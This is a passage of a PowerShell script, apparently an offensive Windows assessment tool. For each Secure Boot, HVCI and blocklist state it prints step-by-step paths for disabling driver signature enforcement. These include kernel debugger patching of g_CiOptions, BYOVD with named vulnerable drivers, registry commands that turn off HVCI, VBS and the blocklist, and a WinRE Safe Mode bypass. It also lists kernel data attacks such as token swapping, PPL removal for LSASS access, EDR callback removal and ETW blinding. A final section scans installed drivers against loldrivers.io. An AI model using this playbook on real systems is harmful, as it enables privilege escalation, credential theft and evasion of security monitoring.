    } else {
        Step 1 "From debugger host: WinDbg -k net:port=50000,key=<KEY>"
        Step 2 "Break in, then: ed ci!g_CiOptions 0"
        Note "Resolve symbol: x ci!g_CiOptions (Win10+, g_CiOptions lives in ci.dll)"
        Note "Fallback for older builds: ed nt!g_CiOptions 0"
        Step 3 "Resume target: g"
        Step 4 "On target: sc create Drv type= kernel binPath= C:\path\to\driver.sys && sc start Drv"
        Step 5 "(Cleanup) Restore g_CiOptions to original value from debugger"
    }
}
elseif (!$sb) {
    # --- EASY: Secure Boot off, set BCD ---
    Write-Host "    + Secure Boot OFF. BCD flags are not firmware-protected." -ForegroundColor Green
    Note "Without Secure Boot, the boot manager does not validate BCD integrity."
    Note "testsigning makes ci.dll accept test-signed drivers (test certificates)."
    Write-Host ""
    Step 1 "bcdedit /set testsigning on"
    Step 2 "shutdown /r /t 0"
    Step 3 "sc create Drv type= kernel binPath= C:\path\to\driver.sys && sc start Drv"

    if ($hvciOn) {
        Write-Host ""
        Write-Host "    * HVCI is running (testsigning still works):" -ForegroundColor Yellow
        Note "HVCI enforces that kernel code passes code integrity validation via skci.dll"
        Note "in VTL1. A test-signed driver IS signed (test certificate). With testsigning"
        Note "enabled, test certificates are accepted by CI. HVCI validates the signature,"
        Note "finds it acceptable, and allows the driver to load."
        Note ""
        Note "HVCI does enforce W^X (EPT): kernel code pages are writable XOR executable."
        Note "This blocks g_CiOptions patching and unsigned code injection, but does NOT"
        Note "block loading of test-signed or production-signed drivers."
        Note ""
        Note "Data-only attacks (token swap, PPL zero, callback removal, ETW blind) work"
        Note "regardless since EPROCESS and callback arrays reside in VTL0."
        Note ""
        Note "To fully remove HVCI (optional, only needed for unsigned drivers or code injection):"
        Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity`" /v Enabled /t REG_DWORD /d 0 /f"
        Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f"
        Cmd "bcdedit /set vsmlaunchtype off && bcdedit /set hypervisorlaunchtype off"
    } elseif ($vbsOn) {
        Write-Host ""
        Write-Host "    * VBS hypervisor is loaded without HVCI (optional to remove):" -ForegroundColor Yellow
        Note "The hypervisor is active (VTL0/VTL1 split) but HVCI is not consuming it."
        Note "ci.dll enforces DSE in VTL0 only. g_CiOptions is in normal kernel memory"
        Note "and BCD testsigning takes effect normally. No W^X enforcement on code pages."
        Note "To fully unload the hypervisor (reduces overhead, cleans up):"
        Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f"
    }

    if ($gpoConflict) {
        Write-Host ""
        Write-Host "    * GPO conflict must be resolved:" -ForegroundColor Yellow
        Note "The GPO policy key says VBS=0 but the actual boot key says VBS=1."
        Note "Boot manager reads HKLM\SYSTEM\...\DeviceGuard, not the policy hive."
        Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f"
    }

    if ($sgCfg -or ($null -ne $sgLaunch -and $sgLaunch -ge 1)) {
        Write-Host ""
        Write-Host "    * SystemGuard must be disabled to fully unload hypervisor:" -ForegroundColor Yellow
        Note "ConfigureSystemGuardLaunch=$sgLaunch keeps the hypervisor alive as a"
        Note "VBS consumer, independent of EnableVBS. Remove the policy value:"
        Cmd "reg delete `"HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard`" /v ConfigureSystemGuardLaunch /f"
    }
}
elseif ($sb -and !$hvciOn -and !$blActive) {
    # --- MODERATE: BYOVD + DSE patch, no blocklist ---
    Write-Host "    ~ BYOVD + g_CiOptions patch (live, no reboot needed)" -ForegroundColor Yellow
    Note "Secure Boot locks BCD flags, but HVCI is off so g_CiOptions resides in"
    Note "VTL0 kernel memory. A vulnerable signed driver provides arbitrary R/W to"
    Note "patch g_CiOptions, temporarily disabling DSE for your target driver load."
    Write-Host ""
    Step 1 "Load a validly-signed vulnerable driver (sig + timestamp must be valid):"
    Cmd "sc create VulnDrv type= kernel binPath= C:\path\to\vuln.sys"
    Cmd "sc start VulnDrv"
    Step 2 "Find g_CiOptions in kernel memory:"
    Note "NtQuerySystemInformation(SystemModuleInformation) to get ci.dll base address"
    Note "Map ci.dll from disk in usermode, signature-scan for g_CiOptions reference"
    Note "(g_CiOptions is NOT exported, resolve via pattern scan or build-specific offset)"
    Note "Common pattern: scan CiInitialize for MOV to the global (RIP-relative LEA)"
    Note "Kernel VA = ci.dll base + scanned RVA"
    Step 3 "Patch g_CiOptions via driver R/W primitive:"
    Note "Save original value first (read before writing)"
    Note "Write 0x0 to disable all code integrity enforcement"
    Note "Common observed values: 0x6 (default enforcement), 0xE (with UMCI)"
    Note "Internal bit layout is undocumented and varies by build. SDK constants"
    Note "(CODEINTEGRITY_OPTION_*) describe NtQuerySystemInformation return values,"
    Note "not necessarily the internal g_CiOptions layout. For bypass: read, zero, restore."
    Step 4 "Load target driver:"
    Cmd "sc create Target type= kernel binPath= C:\path\to\target.sys"
    Cmd "sc start Target"
    Step 5 "Restore g_CiOptions to saved original value, stop and delete VulnDrv"
    Write-Host ""
    Write-Host "    + Blocklist INACTIVE. Known BYOVD drivers will load:" -ForegroundColor Green
    Note "RTCore64.sys (MSI), gdrv.sys (Gigabyte), dbutil_2_3.sys (Dell),"
    Note "Eneio64.sys (ENE), AsrDrv106.sys (ASRock), HwRwDrv.sys (Huawei)"
    Note "Full catalog: https://www.loldrivers.io/"
}
elseif ($sb -and !$hvciOn -and $blActive) {
    # --- MODERATE: Blocklist active, disable first ---
    Write-Host "    ~ Disable driver blocklist, then BYOVD + g_CiOptions patch" -ForegroundColor Yellow
    Note "The Microsoft Vulnerable Driver Blocklist (driversipolicy.p7b) is enforced"
    Note "by ci.dll and blocks known BYOVD drivers by hash/certificate. Disabling it"
    Note "via registry requires a reboot for the policy to unload."
    Note "Note: Windows Update may re-enable the blocklist after cumulative updates."
    Write-Host ""
    Write-Host "    ! Blocklist is ACTIVE ($((Get-Item $blPath).Length) bytes)" -ForegroundColor Yellow
    Note "Contains revoked certs and driver hashes. Common BYOVD drivers may be blocked."
    Write-Host ""
    Write-Host "    Phase 1: Disable blocklist (requires reboot)" -ForegroundColor White
    Step 1 "Disable blocklist:"
    Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\CI\Config`" /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0 /f"
    Step 2 "shutdown /r /t 0"
    Note "Alternative: skip Phase 1 by using a BYOVD driver not on the blocklist (loldrivers.io)"
    Write-Host ""
    Write-Host "    Phase 2: BYOVD + g_CiOptions patch (live, no further reboot)" -ForegroundColor White
    Note "HVCI is off, so g_CiOptions resides in VTL0 kernel memory. A vulnerable"
    Note "signed driver provides arbitrary R/W to patch g_CiOptions, temporarily"
    Note "disabling DSE for your target driver load."
    Write-Host ""
    Step 3 "Load a validly-signed vulnerable driver (sig + timestamp must be valid):"
    Cmd "sc create VulnDrv type= kernel binPath= C:\path\to\vuln.sys"
    Cmd "sc start VulnDrv"
    Step 4 "Find g_CiOptions in kernel memory:"
    Note "NtQuerySystemInformation(SystemModuleInformation) to get ci.dll base address"
    Note "Map ci.dll from disk in usermode, signature-scan for g_CiOptions reference"
    Note "(g_CiOptions is NOT exported, resolve via pattern scan or build-specific offset)"
    Note "Common pattern: scan CiInitialize for MOV to the global (RIP-relative LEA)"
    Note "Kernel VA = ci.dll base + scanned RVA"
    Step 5 "Patch g_CiOptions via driver R/W primitive:"
    Note "Save original value first (read before writing)"
    Note "Write 0x0 to disable all code integrity enforcement"
    Note "Common observed values: 0x6 (default enforcement), 0xE (with UMCI)"
    Note "Internal bit layout is undocumented and varies by build. For bypass: read, zero, restore."
    Step 6 "Load target driver:"
    Cmd "sc create Target type= kernel binPath= C:\path\to\target.sys"
    Cmd "sc start Target"
    Step 7 "Restore g_CiOptions to saved original value, stop and delete VulnDrv"
}
elseif ($sb -and $hvciOn -and !$hvciUefiLocked) {
    # --- HARD: HVCI on but not UEFI locked ---
    Write-Host "    Option A: Data-only BYOVD (live, no reboot, HVCI stays on)" -ForegroundColor Yellow
    Note "HVCI delegates code integrity enforcement to the Secure Kernel (skci.dll)"
    Note "running in VTL1. Patching g_CiOptions in VTL0 ci.dll has no effect because"
    Note "skci.dll performs validation independently. Code pages are EPT W^X enforced."
    Note "Kernel DATA structures remain in VTL0 and are writable via arbitrary R/W."
    Write-Host ""
    Step 1 "Load validly-signed BYOVD driver (HVCI does not block signed drivers)"
    Step 2 "Use arbitrary R/W for data-only kernel attacks:"
    Note "Token Swap:       Read SYSTEM EPROCESS.Token, write to your EPROCESS.Token"
    Note "                  Resolve offset dynamically (PDB download or pattern scan)"
    Note "                  Find EPROCESS: PsInitialSystemProcess + ActiveProcessLinks walk"
    Note "                  or NtQuerySystemInformation(SystemProcessInformation)"
    Note "PPL Bypass:       Write 0x0 to EPROCESS.Protection (PS_PROTECTION byte)"
    Note "                  Allows OpenProcess(PROCESS_ALL_ACCESS) on LSASS/protected procs"
    Note "Callback Removal: Walk PspCreateProcessNotifyRoutine array, zero entries"
    Note "                  Blinds EDR kernel callbacks for process/thread/image events"
    Note "ETW Blind:        Patch EtwpEventTracingProvGuid or provider EnableInfo"
    Note "                  Disables kernel-level ETW tracing"
    Write-Host ""
    Write-Host "    ! Cannot load unsigned drivers or patch g_CiOptions with HVCI on." -ForegroundColor Yellow

    Write-Host ""
    Write-Host "    Option B: Disable HVCI via registry (requires reboot)" -ForegroundColor Yellow
    Note "Without UEFI lock, HVCI enablement is controlled by a registry scenario key."
    Note "Disabling it and rebooting unloads the Secure Kernel, making g_CiOptions"
    Note "in VTL0 the sole enforcer again."
    Write-Host ""
    Step 1 "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity`" /v Enabled /t REG_DWORD /d 0 /f"
    if ($gpoEnf) {
        Write-Host ""
        Write-Host "    * GPO will re-enable HVCI on refresh (~90min). Prevent this:" -ForegroundColor Yellow
        Step 2 "sc stop gpsvc && sc config gpsvc start= disabled"
        Note "Alternative: block SYSVOL access to prevent policy download:"
        Cmd "netsh advfirewall firewall add rule name=BlockSYSVOL dir=out action=block protocol=tcp remoteport=445"
        Step 3 "shutdown /r /t 0"
        Step 4 "After reboot: HVCI off, use BYOVD + g_CiOptions patch"
    } else {
        Step 2 "shutdown /r /t 0"
        Step 3 "After reboot: HVCI off, use BYOVD + g_CiOptions patch"
    }

    Write-Host ""
    Write-Host "    Option C: WinRE Safe Mode bypass (physical access required)" -ForegroundColor Yellow
    Note "Force Windows Recovery Environment via 2 consecutive hard shutdowns during"
    Note "boot (power off during Windows logo). After the second forced shutdown,"
    Note "Windows enters WinRE with Automatic Repair. VBS/HVCI do not run in Safe Mode."
    Write-Host ""
    Step 1 "Hard power-off during boot 2x consecutively to trigger WinRE"
    Step 2 "In WinRE: skip encrypted OS volume (if BitLocker), open Command Prompt"
    Note "BCD store is on unencrypted EFI System Partition, always writable from WinRE"
    Step 3 "bcdedit /set {default} safeboot minimal"
    Step 4 "Reboot: system enters Safe Mode (hypervisor does not load)"
    Note "BitLocker TPM-only: Safe Mode may trigger recovery key prompt (PCR mismatch)"
    Note "BitLocker TPM+PIN: recovery key required (BCD change invalidates PCR seal)"
    Step 5 "In Safe Mode (VBS/HVCI inactive): disable VBS via registry"
    Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f"
    Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity`" /v Enabled /t REG_DWORD /d 0 /f"
    Step 6 "Remove Safe Mode boot and reboot normally:"
    Cmd "bcdedit /deletevalue {default} safeboot"
    Cmd "shutdown /r /t 0"
    Step 7 "After reboot: VBS/HVCI disabled, use BYOVD + g_CiOptions patch"
    if ($gpoEnf) {
        Write-Host ""
        Write-Host "    * GPO will re-enable on next refresh. Stop gpsvc in Safe Mode:" -ForegroundColor Yellow
        Cmd "sc config gpsvc start= disabled"
    }

    if ($cgLk) {
        Write-Host ""
        Write-Host "    * Credential Guard is separately UEFI locked" -ForegroundColor Yellow
        Note "CG lock does not prevent HVCI disable or DSE bypass. LSASS credential"
        Note "protection remains active independently. Only relevant if targeting LSASS."
    }

    if ($isVM) {
        Write-Host ""
        Write-Host "    * Virtual machine detected" -ForegroundColor Yellow
        Note "WinRE hard-shutdown technique may not work in VMs (no physical power button)."
        Note "For Hyper-V Gen2: Secure Boot is virtual, controllable from host PowerShell:"
        Cmd "Set-VMFirmware -VMName <Name> -EnableSecureBoot Off"
        Note "For VMware/VBox: edit VM settings to disable Secure Boot and VBS."
    }
}
elseif ($sb -and $hvciOn -and $hvciUefiLocked) {
    # --- VERY HARD: HVCI UEFI locked ---
    Write-Host "    Maximum hardening. HVCI is UEFI locked." -ForegroundColor Red
    Note "UEFI lock persists the HVCI enable state in Secure Boot UEFI variables."
    Note "Registry changes to the HVCI scenario key are ignored at boot. Only firmware"
    Note "intervention (clearing Secure Boot keys) can remove the lock."

    Write-Host ""
    Write-Host "    Option A: Data-only BYOVD (same as HARD path above)" -ForegroundColor Yellow
    Step 1 "Load validly-signed BYOVD driver"
    Step 2 "Token swap, PPL bypass, callback removal, ETW blind via arbitrary R/W"
    Note "All data-only techniques work. No unsigned driver loading possible."
    if ($blActive) {
        Note "Blocklist registry key is NOT UEFI locked and can still be disabled:"
        Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\CI\Config`" /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0 /f"
    }

    Write-Host ""
    Write-Host "    Option B: WinRE Safe Mode bypass (physical access required)" -ForegroundColor Yellow
    Note "Even with UEFI-locked HVCI, the hypervisor does not load in Safe Mode."
    Note "UEFI lock prevents registry changes from taking effect on NORMAL boot, but"
    Note "Safe Mode skips hypervisor initialization entirely regardless of lock state."
    Write-Host ""
    Step 1 "Hard power-off during boot 2x consecutively to trigger WinRE"
    Step 2 "In WinRE: skip encrypted OS volume (if BitLocker), open Command Prompt"
    Note "BCD store is on unencrypted EFI System Partition, always writable from WinRE"
    Step 3 "bcdedit /set {default} safeboot minimal"
    Step 4 "Reboot: system enters Safe Mode (hypervisor does not load)"
    Note "BitLocker TPM-only: Safe Mode may trigger recovery key prompt (PCR mismatch)"
    Note "BitLocker TPM+PIN: recovery key required (BCD change invalidates PCR seal)"
    Note "IMPORTANT: UEFI lock is irrelevant here because the hypervisor never starts."
    Note "g_CiOptions in ci.dll (VTL0, no VTL1 exists) is the sole enforcer in Safe Mode."
    Step 5 "In Safe Mode: use BYOVD + g_CiOptions patch directly"
    Note "Load vulnerable signed driver, patch g_CiOptions to 0x0, load target driver."
    Note "This is a one-shot bypass for the current Safe Mode session only."
    Note "Registry VBS disable has NO persistent effect here (UEFI lock overrides on"
    Note "normal boot). For persistent disable: firmware intervention (Option C)."
    Step 6 "Remove Safe Mode boot:"
    Cmd "bcdedit /deletevalue {default} safeboot"
    Cmd "shutdown /r /t 0"
    Note "After normal reboot: UEFI lock re-enables HVCI. Safe Mode bypass must be"
    Note "repeated for each session, or use Option C for permanent removal."
    if ($gpoEnf) {
        Write-Host ""
        Write-Host "    * GPO will re-enable on next refresh. Stop gpsvc in Safe Mode:" -ForegroundColor Yellow
        Cmd "sc config gpsvc start= disabled"
    }

    Write-Host ""
    Write-Host "    Option C: Firmware intervention (physical or BMC access)" -ForegroundColor Yellow
    Step 1 "Access UEFI setup: physical console, IPMI, iLO, iDRAC, or vPro AMT"
    Step 2 "Clear Secure Boot keys (PK/KEK/db/dbx) or use SecConfig.efi"
    Note "SecConfig.efi is a Microsoft tool that removes the UEFI lock variable."
    Note "Requires physical presence confirmation (press key at boot prompt)."
    Step 3 "Reboot into Windows, HVCI is now registry-disableable"
    Step 4 "Use SB+HVCI or SB+NoHV attack paths"

    if ($isVM) {
        Write-Host ""
        Write-Host "    * Virtual machine detected" -ForegroundColor Yellow
        Note "WinRE hard-shutdown technique may not work in VMs (no physical power button)."
        Note "For Hyper-V Gen2: Secure Boot is virtual, controllable from host PowerShell:"
        Cmd "Set-VMFirmware -VMName <Name> -EnableSecureBoot Off"
        Note "For VMware/VBox: edit VM settings to disable Secure Boot and VBS."
    }
}
else {
    Write-Host "    ? Non-standard configuration. Review CONTROLS section." -ForegroundColor Gray
}

Write-Host ""
Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor DarkCyan

# ===================== VULNERABLE DRIVER SCAN =====================

Write-Host ""
Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor DarkCyan
Write-Host "   VULNERABLE DRIVER SCAN" -ForegroundColor White
Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor DarkCyan
Write-Host ""

$loldriversData = $null
$lolSource = $null

if ($LolDriversJson -and (Test-Path $LolDriversJson)) {
    # Local JSON file provided via parameter
    try {
        $rawJson = Get-Content -Path $LolDriversJson -Raw -EA Stop
        $loldriversData = $rawJson.Replace('"INIT"','"init"').Replace('"PAGE"','"page"') | ConvertFrom-Json
        $lolSource = $LolDriversJson
    } catch {
        Write-Host "    [-] Failed to parse local JSON file: $LolDriversJson" -ForegroundColor Red
        Write-Host "        Error: $($_.Exception.Message)" -ForegroundColor DarkGray
    }
} elseif ($LolDriversJson) {
    Write-Host "    [-] Specified JSON file not found: $LolDriversJson" -ForegroundColor Red
} else {
    # Try fetching from loldrivers.io API
    try {
        $webClient = New-Object System.Net.WebClient
        $rawJson = $webClient.DownloadString("https://www.loldrivers.io/api/drivers.json")
        $loldriversData = $rawJson.Replace('"INIT"','"init"').Replace('"PAGE"','"page"') | ConvertFrom-Json
        $lolSource = "https://www.loldrivers.io/api/drivers.json"
    } catch {
        Write-Host "    [-] Failed to reach https://www.loldrivers.io/api/drivers.json" -ForegroundColor Red
        Write-Host "        Error: $($_.Exception.Message)" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "    Use -LolDriversJson <path> to specify a local copy of drivers.json" -ForegroundColor Yellow
        Write-Host ""
    }
}

if ($loldriversData) {
    $drivers = Get-ChildItem -Path "C:\Windows\System32\drivers" -EA SilentlyContinue
    $driverNames = @{}
    foreach ($d in $drivers) { $driverNames[$d.Name.ToLower()] = $d.FullName }

    Write-Host "    Source:  $lolSource" -ForegroundColor DarkGray
    Write-Host "    Scanned: $($drivers.Count) drivers in C:\Windows\System32\drivers" -ForegroundColor DarkGray
    Write-Host ""

    $vulnCount = 0

    foreach ($lol in $loldriversData.KnownVulnerableSamples) {
        if (-not $lol.Filename) { continue }
        $fname = $lol.Filename.ToLower()

        if ($driverNames.ContainsKey($fname)) {
            $driverPath = $driverNames[$fname]
            $fileHash = (Get-FileHash -Path $driverPath -Algorithm SHA256 -EA SilentlyContinue).Hash

            if ($fileHash -and $lol.SHA256 -and $fileHash -eq $lol.SHA256) {
                Write-Host "    [!] VULNERABLE: " -NoNewline -ForegroundColor Red
                Write-Host "$($lol.Filename)" -NoNewline -ForegroundColor White
                Write-Host " (SHA256 match)" -ForegroundColor Red
                Write-Host "        Path:   $driverPath" -ForegroundColor DarkGray
                Write-Host "        SHA256: $fileHash" -ForegroundColor DarkGray
                $vulnCount++
            }
        }
    }

    if ($vulnCount -eq 0) {
        Write-Host "    [+] No known vulnerable drivers found on this system." -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "    Found $vulnCount vulnerable driver(s). Check https://www.loldrivers.io for exploitation details." -ForegroundColor Yellow
    }
}

Write-Host ""
Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor DarkCyan
Write-Host ""
